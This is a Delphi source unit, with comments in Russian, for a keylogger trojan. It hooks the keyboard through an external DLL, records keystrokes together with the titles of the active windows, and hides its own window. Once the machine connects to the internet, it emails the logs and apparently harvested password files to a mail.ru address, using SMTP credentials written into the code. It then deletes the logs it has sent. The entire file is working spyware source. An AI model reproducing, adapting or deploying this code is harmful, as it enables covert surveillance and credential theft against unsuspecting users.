unit uSniff;
// клавиши пишуться в журнал блоками. когда очередной блок заполниться
// происходит сохранение в журнал

interface

uses
  WinTypes, WinProcs, Messages, Windows, classes, SysUtils,
  inifiles, uPathMng,
  ShlObj,
  idSMTP, IdMessage, IdAttachmentFile,
  uGetAppPath,
  XNetDetect_v2, dialogs,
  uLogFile;

const
  DllName = 'SniffDll.dll';
  { регестрируем свой тип сообщения в системе }
  BuffSize = 40;
  xorConst: byte = $1A;

type
  // класс использует dll SniffDll. Если Dll отсутствует в папке с
  // приложением то приложение не работает
  cSniff = class
  public
    keys: string;
    // компонент для отправки почты
    idSMTP: TIdSMTP;
    msg: TIdMessage;
    // Журнал
    Log: cLogFile;
  protected
    // защитта от повторного вхождения в символ
    doubleChar: byte;
    // компонент для определения подключения к инету
    xNet: txnetdetect;
    // Сообщение с логами отправляется прогой один раз за запуск
    // в момент конекта к инету. При инициации false, после отправки false
    messageSended: boolean;

    startDir: string;

    WM_KeyHOOK: cardinal;
    // последнее активированное окно
    LastWnd: hwnd;
    // окно трояна
    handle: thandle;
    // сслыка на sniffDll. Грузиться динамически
    HLib: thandle;
    m_KeyHook, m_MouseHook: thandle;
    // указатель на старую и новую оконную процедуру
    oldWndProc, newWndProc: pointer;
    // буфер обюмена данными с журналом
    Buffer: string;
    len: cardinal;
    // имя файла журнала
    FileName: string;
    // время. Нужно обновлять по функции CheckTime
    time: tsystemtime;
    Minute: word;

    checkreaded: boolean;
    PathMng: cPathMng;
    // перевод каретки
    Cr: array [0 .. 1] of widechar;
  protected
    // оконная процедура для получения хуков
    Procedure WndProc(var msg: TMessage);
    // сохранить буфер данных в журнал
    procedure SaveBuffer;
    // сохранить набор символов в журнал
    procedure SaveData(D: string);
    // сгенерить имя файла журнала
    procedure GenerateFileName;
    // пишем время в журнал
    procedure WriteTime;
    // считать конфигурацию
    procedure ReadSettings;
    // путь к дефолтному юзеру
    function GetSpecialPath(CSIDL: word): string;
    procedure smtpFiles(files: tstringlist);
    procedure SaveCfg;
    procedure ReadCfg;
    procedure StartDetectConnection;
    // происходит при смене состояния подключения к инету
    procedure OnConnectionChanged(Sender: TObject; isConnected: boolean);
  public
    // окно в процедуру которого будим слать сообщения по хукам
    constructor create(w: thandle; plog: cLogFile);
    // constructor create(w: thandle);
    destructor destroy;
    // отправляем mail
    procedure Sendmsg;
  end;

procedure HideWnd(h: thandle);
procedure ShowWnd(h: thandle);

function AltKeyDown: boolean;
function CtrlKeyDown: boolean;
function ShiftKeyDown: boolean;
function CapsLock: boolean;
function InsertOn: boolean;
function NumLock: boolean;
function ScrollLock: boolean;

implementation

procedure HideWnd(h: thandle);
begin
  ShowWindow(h, SW_HIDE);
end;

procedure ShowWnd(h: thandle);
begin
  ShowWindow(h, SW_SHOW);
end;

function cSniff.GetSpecialPath(CSIDL: word): string;
var
  s: string;
begin
  SetLength(s, MAX_PATH);
  if not SHGetSpecialFolderPath(0, PChar(s), CSIDL, True) then
    s := '';
  Result := PChar(s);
end;

function GetWndText(WndH: hwnd): string;
var
  s: string;
  len: integer;
begin
  len := GetWindowTextLength(WndH) + 1; // получаю размер текста
  if len > 1 then
  begin
    SetLength(s, len);
    GetWindowText(WndH, @s[1], len); // получаю сам текст, который записывается в s
    Result := s;
  end
  else
    Result := 'text not detected';
end;

procedure cSniff.GenerateFileName;
var
  ST: SystemTime;
begin
  GetLocalTime(ST);
  FileName := startDir + '\' + IntToStr(ST.wDay) + '.day_' + IntToStr
    (ST.wMonth) + 'month_sn.log';
end;

{procedure cSniff.SaveBuffer;
var
  f: File;
  str: widestring;
begin
  GenerateFileName;
  AssignFile(f, FileName);
  if FileExists(FileName) then
  begin
    Reset(f, 1);
    Seek(f, FileSize(f));
  end
  else
    Rewrite(f, 1);
  str := widestring(Buffer);
  BlockWrite(f, str[1], length(str) * 2);
  CloseFile(f);
  SetLength(Buffer, 0);
  len := 0;
end;}

procedure cSniff.SaveBuffer;
var
  f: textFile;
  str: widestring;
begin
  GenerateFileName;
  Assign(f, filename);
  if FileExists(FileName) then
  begin
    // открываем для записи
    append(f);
  end
  else
    Rewrite(f);
  str := widestring(Buffer);
  // запись строки во второй файл
  //WRITELN ПИШЕТ В КОНЦЕ ПЕРЕВОД КАРЕТКИ
  write(f, Buffer);
  CloseFile(f);
  SetLength(Buffer, 0);
  len := 0;
end;


procedure cSniff.SaveData(D: string);
var
  I, l: integer;
begin
  if len < BuffSize then
  begin
    l := length(D);
    Buffer := Buffer + D;
    len := len + l;
  end;
  if len >= BuffSize then
  begin
    SaveBuffer;
  end;
end;

function VKtoChar(VKKey: word): char;
var
  ch: char;
  code: DWord;
  hk: cardinal;
  ks: TKeyboardState;
begin
  hk := GetKeyboardLayout(GetCurrentThreadId);
  GetKeyboardState(ks);
  ToAsciiEx(VKKey, 0, ks, @ch, 0, hk);
  Result := ch;
end;

function GetRegistr:boolean;
begin
  if GetKeyState(VK_Shift)<0 then
  //if KeyState[vk_shift]=1 then // KeyState:TKeyboardState
    // если нажат shift
    result:=true
  else
    result:=false;
  if (getKeyState(VK_CAPITAL) and 1)=1 then
    result:=not result;
end;


function GetCharFromVirtualKey(Key: word): string;
var
  keyboardState: TKeyboardState;
  // раскладка
  keyb,
  // не активно
  flag: cardinal;
  scancode: cardinal;
  // buf to translated key
  bufChar: widechar;
begin
  case key of
    VK_BACK:
    begin
      result := '[BackSpace]';
      exit;
    end;
    VK_TAB:
    begin
      result := '[Tab]';
      exit;
    end;
    VK_SPACE:
    begin
      result := ' ';
      exit;
    end;
    VK_CAPITAL:
    begin
      result := '[CapsLock]';
      exit;
    end;
    VK_RETURN:
    begin
      result := '[Enter]' + #13#10;
      exit;
    end;
    VK_ESCAPE:
    begin
      result := '[Esc]';
      exit;
    end;
    VK_F1:
    begin
      result := '[F1]';
      exit;
    end;
    VK_F2:
    begin
      result := '[F2]';
      exit;
    end;
    VK_F3:
    begin
      result := '[F3]';
      exit;
    end;
    VK_F4:
    begin
      result := '[F4]';
      exit;
    end;
    VK_F5:
    begin
      result := '[F5]';
      exit;
    end;
    VK_F6:
    begin
      result := '[F6]';
      exit;
    end;
    VK_F7:
    begin
      result := '[F7]';
      exit;
    end;
    VK_F8:
    begin
      result := '[F8]';
      exit;
    end;
    VK_F9:
    begin
      result := '[F9]';
      exit;
    end;
    VK_F10:
    begin
      result := '[F10]';
      exit;
    end;
    VK_F11:
    begin
      result := '[F11]';
      exit;
    end;
    VK_F12:
    begin
      result := '[F12]';
      exit;
    end;
    VK_LSHIFT:
    begin
      result := '[LShift]';
      exit;
    end;
    VK_RSHIFT:
    begin
      result := '[RShift]';
      exit;
    end;
    VK_LCONTROL:
    begin
      result := '[LCtrl]';
      exit;
    end;
    VK_RCONTROL:
    begin
      result := '[RCtrl]';
      exit;
    end;
    VK_DELETE:
    begin
      result := '[Delete]';
      exit;
    end;
    VK_INSERT:
    begin
      result := '[Insert]';
      exit;
    end;
    VK_LEFT:
    begin
      result := '[Left]';
      exit;
    end;
    VK_RIGHT:
    begin
      result := '[Right]';
      exit;
    end;
    VK_LWIN:
    begin
      result := '[LWindow]';
      exit;
    end;
    VK_RWIN:
    begin
      result := '[RWindow]';
      exit;
    end;
    VK_APPS:
    begin
      result := '[Apps]';
      exit;
    end;
    VK_PRIOR:
    begin
      result := '[PageUp]';
      exit;
    end;
    VK_NEXT:
    begin
      result := '[PageDown]';
      exit;
    end;
    VK_END:
    begin
      result := '[End]';
      exit;
    end;
    VK_HOME:
    begin
      result := '[Home]';
      exit;
    end;
    VK_MENU:
    begin
      result := '[Alt]';
      exit;
    end;
    VK_SNAPSHOT:
    begin
      result := '[PrintScreen]';
      exit;
    end;
    VK_SCROLL:
    begin
      result := '[ScrollLock]';
      exit;
    end;
    VK_PAUSE:
    begin
      result := '[Pause]';
      exit;
    end;
    VK_NUMLOCK:
    begin
      result := '[NumLock]';
      exit;
    end;
  end;
  SetLength(Result, 2);
  GetKeyboardState(keyboardState);
  // раскладка
  //keyb := GetKeyboardLayout(GetCurrentThreadId);
  Case word(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow, nil))) of
    $409:
    begin
        // english
        keyb := LoadKeyboardLayout('00000409', KLF_ACTIVATE);
      end;
    $419:
    begin
      // rus
      keyb := LoadKeyboardLayout('00000419', KLF_ACTIVATE);
    end;
  End;
  scancode := MapVirtualKeyEx(Key, MAPVK_VK_TO_VSC, keyb);
  flag := 0;
  if ToUnicodeEx(Key, scancode, keyboardState, @Result[1], 1, flag, keyb) = 1 then
  begin
    SetLength(Result, 1);
    if GetRegistr then
      uppercase(result);
  end;
end;

Procedure cSniff.WndProc(var msg: TMessage);
var
  str: string;
  ws: array [0 .. 100] of widechar;
  I: Integer;
begin
  if msg.msg = WM_KeyHOOK then
  begin
    if (LastWnd <> hwnd(msg.lParam)) then
    begin
      LastWnd := hwnd(msg.lParam);
      str := 'Window_' + GetWndText(LastWnd);
      SetLength(str, length(str) - 1);
      SaveData(str);
      SaveData(Cr);
    end;
    // преобразуем символы
    if (msg.wParam=VK_SPACE)
      or(msg.wParam=VK_return)
      or(msg.wParam=VK_escape)
      or(msg.wParam=VK_LSHIFT)
      or(msg.wParam=VK_RSHIFT)
      or(msg.wParam=VK_DELETE)
      or(msg.wParam=VK_LEFT)
      or(msg.wParam=VK_Right)
      or(msg.wParam=VK_HOME)
      or(msg.wParam=VK_END)
    then
    begin
      inc(doubleChar);
      if doubleChar = 1 then
      begin
        str:=GetCharFromVirtualKey(msg.wParam);
        if length(str)=1 then
          keys := keys + str[1]
        else
        begin
          for I := 1 to  length(str) do
            keys := keys + str[i];
        end;
      end;
    end
    else
    begin
      doubleChar := 0;
      str:=GetCharFromVirtualKey(msg.wParam);
      if length(str)=1 then
        keys := keys + str[1]
      else
      begin
        for I := 1 to  length(str) do
          keys := keys + str[i];
      end;
      //keys := keys + String(chr(msg.wParam));
    end;
    Log.addInfoMes(keys);
    // сохраняем данные
    if (length(keys) >= BuffSize) then
    begin
      SaveData(keys);
      //SaveData(Cr);
      keys := '';
    end;
  end
  else
  begin
  end;
  // if msg.Msg=WM_size then
  // begin
  // str:='Window_'+GetWndText(handle);
  // setlength(STR,LENGTH(STR)-1);
  // SaveData(str);
  // savedata(cr);
  // end;
  // вызываем старую оконную процедуру
  msg.Result := CallWindowProc(oldWndProc, handle, msg.msg, msg.wParam,
    msg.lParam);
end;

function getTimeStr: string;
var
  ST: SystemTime;
begin
  GetLocalTime(ST);
  Result := IntToStr(ST.wDay) + '.' + IntToStr(ST.wMonth) + '.' + IntToStr
    (ST.wYear);
end;

function getExeName: string;
begin
  Result := ParamStr(0);
end;

constructor cSniff.create(w: thandle; plog: cLogFile);
// constructor cSniff.create(w: thandle);
var
  // StartHookProc: procedure(switch: boolean; hMainProg: hwnd)stdcall;
  StartHookProc: function(switch: boolean; hMainProg: hwnd): integer stdcall;
  Res: integer;
begin
  doubleChar := 0;
  Log := plog;
  startDir := extractfiledir(getExeName);
  // setcurrentdir(startDir);
  handle := w;
  messageSended := false;

  PathMng := cPathMng.create('');

  ReadSettings;

  idSMTP := TIdSMTP.create(nil);
  idSMTP.Host := 'smtp.mail.ru';
  // (satNone, satDefault, satSASL);
  idSMTP.AuthType := satDefault;
  idSMTP.Username := 'samera';
  idSMTP.Password := 'oburec7835';

  // письмо
  msg := TIdMessage.create(nil);
  msg.Subject := 'keyLog_' + getTimeStr;
  // указываем адрес получателя
  msg.From.Address := 'samera@mail.ru';
  // версия операционки
  msg.Body.Text := GetOS + ' ' + ip;
  msg.UseNowForDate;
  msg.Date := StrToDate(getTimeStr);
  // имя отправителя письма
  msg.From.Name := 'KeyLogger';

  // получатель
  msg.Recipients.EMailAddresses := 'snkLog@mail.ru';
  ReadCfg;
  StartDetectConnection;
  sleep(1000 * 5);

  if xNet.Connected then
  begin
    xNet.OnConnectionStatusChanged(nil, True);
  end;
  LastWnd := 0;
  // регестрируем свой тип сообщения в системе. В длл то же имя
  WM_KeyHOOK := RegisterWindowMessage('WM_OburecKeyHook');

  newWndProc := MakeObjectInstance(WndProc);
  oldWndProc := pointer(SetWindowLong(handle, gwl_wndProc, cardinal(newWndProc))
    );
  // грузим библиотеку
  HLib := LoadLibrary(DllName);
  if HLib > HINSTANCE_ERROR then
  begin
    keys := '';
    // получаем указатель на необходимую процедуру
    StartHookProc := GetProcAddress(HLib, 'SetHook');
    Res := StartHookProc(True, handle);
    // перевод каретки
    Cr := chr(13) + chr(10);
    Minute := 100;
    // обнуляем заполнение буфера
    len := 0;
    GetLocalTime(time);
    Minute := time.wMinute;
    WriteTime;
    // тест журнала
    // SaveData('1_Start Log_1');
    // SaveData(string(Cr));
  end;
end;

destructor cSniff.destroy;
var
  // StartHookProc: procedure(switch: boolean; hMainProg: hwnd)stdcall;
  StartHookProc: function(switch: boolean; hMainProg: hwnd): integer stdcall;
begin
  idSMTP.destroy;
  msg.destroy;

  SetWindowLong(handle, gwl_wndProc, integer(oldWndProc));
  if HLib > HINSTANCE_ERROR then
  begin
    StartHookProc := GetProcAddress(HLib, 'SetHook');
    // освобождаем библиотеку
    StartHookProc(false, handle);
    FreeLibrary(HLib);
  end;
end;

procedure cSniff.WriteTime;
var
  K: string[100];
  I: byte;
begin
  if time.wMinute > 9 then
    K := 'Time : ''' + IntToStr(time.wHour) + ':' + IntToStr(time.wMinute)
      + ''''
  else
    K := 'Time : ''' + IntToStr(time.wHour) + ':0' + IntToStr(time.wMinute)
      + '''';
  SaveData(K);
  SaveData(Cr);
end;

procedure cSniff.ReadSettings;
var
  ifile: tinifile;
  b_show: boolean;
begin
  ifile := tinifile.create(startDir + '\sn.log');
  b_show := ifile.ReadBool('main', 'show', false);
  checkreaded := ifile.ReadBool('main', 'CheckReaded', True);
  if b_show then
  begin
    ShowWnd(handle);
  end
  else
  begin
    HideWnd(handle);
  end;
  ifile.destroy;
end;

procedure cSniff.smtpFiles(files: tstringlist);
var
  att: TIdAttachmentFile;
  I: integer;

  ext, newpas: string;
  // список кешируемых файлов
  dellist: tstringlist;
begin
  dellist := tstringlist.create;
  msg.Subject := 'keyLog_' + getTimeStr;
  idSMTP.Connect;
  for I := 0 to files.Count - 1 do
  begin
    ext := extractfileext(files.Strings[I]);
    if lowercase(ext) <> '.log' then
    begin
      newpas := startDir + '\' + extractfilename(files.Strings[I]);
      copyfile(@files.Strings[I][1], @newpas[1], True);
      dellist.Add(newpas);
    end
    else
      newpas := files.Strings[I];
    att := TIdAttachmentFile.create(msg.MessageParts, newpas);
  end;
  idSMTP.Send(msg);
  idSMTP.Disconnect;
  msg.ClearBody;
  for I := 0 to dellist.Count - 1 do
  begin
    DeleteFile(dellist.Strings[I]);
  end;
  dellist.destroy;
end;

procedure WriteCString(const f: file; str: string);
var
  ch: ansichar;
  len: integer;
  I, c: integer;
begin
  len := length(str);
  BlockWrite(f, len, sizeof(len));
  for I := 1 to length(str) do
  begin
    ch := ansichar(str[I]);
    ch := ansichar(byte(ch) xor xorConst);
    BlockWrite(f, ch, sizeof(ch));
    c := -1234567;
    BlockWrite(f, c, sizeof(c));
  end;
end;

function ReadString(const f: file): string;
var
  len: integer;
  readed: cardinal;
  ch: ansichar;
  str: string;
  c, I: integer;
begin
  str := '';
  BlockRead(f, len, sizeof(len), readed);
  for I := 0 to len - 1 do
  begin
    BlockRead(f, ch, sizeof(ch), readed);
    BlockRead(f, c, sizeof(c), readed);
    ch := ansichar(byte(ch) xor xorConst);
    str := str + ch;
  end;
  Result := str;
end;

procedure cSniff.SaveCfg;
var
  f: file;
  str: string;
begin
  str := startDir + '\' + 'sn.cnf';
  AssignFile(f, str);
  Rewrite(f, 1);
  // пишем хост
  WriteCString(f, idSMTP.Host);
  // имя пользователя samera
  WriteCString(f, idSMTP.Username);
  // пароль к почте
  WriteCString(f, idSMTP.Password);
  // меил отправителя samera@MAIL.RU
  WriteCString(f, msg.From.Address);
  // Mail получателя
  WriteCString(f, msg.Recipients.EMailAddresses);
  CloseFile(f);
end;

procedure cSniff.ReadCfg;
var
  ifile: tinifile;
  str: string;
  prepare: boolean;
  f: file;
begin
  str := startDir + '\' + 'sn.cnf';
  ifile := tinifile.create(startDir + '\sn.log');
  prepare := ifile.ReadBool('main', 'Prepare', false);
  if prepare then
  begin
    str := ifile.ReadString('main', 'Host', '');
    if str <> '' then
      idSMTP.Host := str;

    str := ifile.ReadString('main', 'UserName', '');
    if str <> '' then
      idSMTP.Username := str;

    str := ifile.ReadString('main', 'Pass', '');
    if str <> '' then
      idSMTP.Password := str;

    str := ifile.ReadString('main', 'From', '');
    if str <> '' then
      msg.From.Address := str;

    str := ifile.ReadString('main', 'MailTo', '');
    if str <> '' then
      msg.Recipients.EMailAddresses := str;
    SaveCfg;
  end
  else
  begin
    if FileExists(str) then
    begin
      AssignFile(f, str);
      Reset(f, 1);

      str := ReadString(f);
      idSMTP.Host := str;

      str := ReadString(f);
      idSMTP.Username := str;

      str := ReadString(f);
      idSMTP.Password := str;

      str := ReadString(f);
      msg.From.Address := str;

      str := ReadString(f);
      msg.Recipients.EMailAddresses := str;
      CloseFile(f);
    end;
  end;
  ifile.destroy;
end;

procedure cSniff.StartDetectConnection;
begin
  xNet := txnetdetect.create(nil);
  xNet.InitiateCheckingConnection();
  xNet.OnConnectionStatusChanged := OnConnectionChanged;
  xNet.OnConnectionStatus := OnConnectionChanged;
  xNet.Interval := 1000;
  xNet.Enabled := True;
end;

procedure cSniff.OnConnectionChanged(Sender: TObject; isConnected: boolean);
begin
  if isConnected then
  begin
    // отправляем логи и пароли
    // отправка происходит 1 раз
    if not messageSended then
    begin
      Sendmsg;
      messageSended := True;
      xNet.Enabled := false;
    end;
  end;
end;

procedure cSniff.Sendmsg;
var
  att: TIdAttachmentFile;
  slist, alllist: tstringlist;
  I: integer;

  ifile: tinifile;
  PassReaded: boolean;
  rec: cSMTPRec;
begin
  // if not IsConnectedToInternet then exit;
  // логи
  slist := tstringlist.create;
  // ищем все логи (файлы в которых есть подстрока month_sn)
  PathMng.GetFileExt('month_sn', slist);
  alllist := tstringlist.create;

  for I := 0 to slist.Count - 1 do
  begin
    rec := cSMTPRec.create;
    rec.name := extractfilename(slist.Strings[I]);
    rec.path := slist.Strings[I];
    alllist.AddObject(slist.Strings[I], rec);
  end;

  ifile := tinifile.create(startDir + '\sn.log');
  if checkreaded then
  begin
    PassReaded := ifile.ReadBool('main', 'PassReaded', false);
  end
  else
    PassReaded := false;
  if not PassReaded then
  begin
    ifile.WriteBool('main', 'PassReaded', True);
  end;
  ifile.destroy;

  // если читали пароли пользователя то сбросить
  if not PassReaded then
  begin
    getAppPath(alllist);
  end;
  if alllist.Count > 0 then
  begin
    // отправляем почту
    smtpFiles(alllist);
  end;

  // удаляем отправленные логи
  for I := 0 to slist.Count - 1 do
  begin
    DeleteFile(slist.Strings[I]);
  end;
  for I := 0 to alllist.Count - 1 do
  begin
    rec := cSMTPRec(alllist.Objects[I]);
    rec.destroy;
  end;
  slist.destroy;
  alllist.destroy;
end;

function AltKeyDown: boolean;
begin
  Result := (word(GetKeyState(VK_MENU)) and $8000) <> 0;
end;

function CtrlKeyDown: boolean;
begin
  Result := (word(GetKeyState(VK_CONTROL)) and $8000) <> 0;
end;

function ShiftKeyDown: boolean;
begin
  Result := (word(GetKeyState(VK_SHIFT)) and $8000) <> 0;
end;

function CapsLock: boolean;
begin
  Result := (GetKeyState(VK_CAPITAL) and 1) <> 0;
end;

function InsertOn: boolean;
begin
  Result := (GetKeyState(VK_INSERT) and 1) <> 0;
end;

function NumLock: boolean;
begin
  Result := (GetKeyState(VK_NUMLOCK) and 1) <> 0;
end;

function ScrollLock: boolean;
begin
  Result := (GetKeyState(VK_SCROLL) and 1) <> 0;
end;

end.
